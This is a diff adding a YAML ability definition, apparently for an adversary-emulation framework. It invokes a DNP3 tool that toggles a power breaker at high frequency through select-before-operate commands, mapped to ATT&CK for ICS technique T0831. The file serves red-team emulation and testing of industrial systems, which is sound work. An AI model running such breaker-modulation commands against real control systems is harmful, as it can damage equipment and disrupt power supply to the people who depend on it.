@@ -1,0 +1,24 @@
+---
+
+- id: 14b02f84-e3dd-4297-837b-8b5b7056dd52
+  name: DNP3 Modulate Breaker SBO
+  description: |
+    DNP3 Function Code 3 (0x03) SELECT
+    DNP3 Function Code 4 (0x04) OPERATE
+
+    Modulate the specified breaker at a high frequency using the select-before-operate function code sequence.
+  tactic: impact
+  technique:
+    attack_id: T0831
+    name: Manipulation of Control
+  repeatable: True
+  platforms:
+    windows:
+      psh:
+        cleanup: rm dnp3actions.exe
+        command: |
+          .\dnp3actions.exe  #{dnp3.server.ip} -p #{dnp3.server.port} #{dnp3.local.link} #{dnp3.remote.link}
+          toggle-sbo --index #{dnp3.server.index} --iterations #{dnp3.operate.iterations}
+          --trip-on #{dnp3.trip.on} --trip-off #{dnp3.trip.off} --on-time #{dnp3.on.time} --off-time #{dnp3.off.time}
+        payloads:
+        - dnp3actions.exe
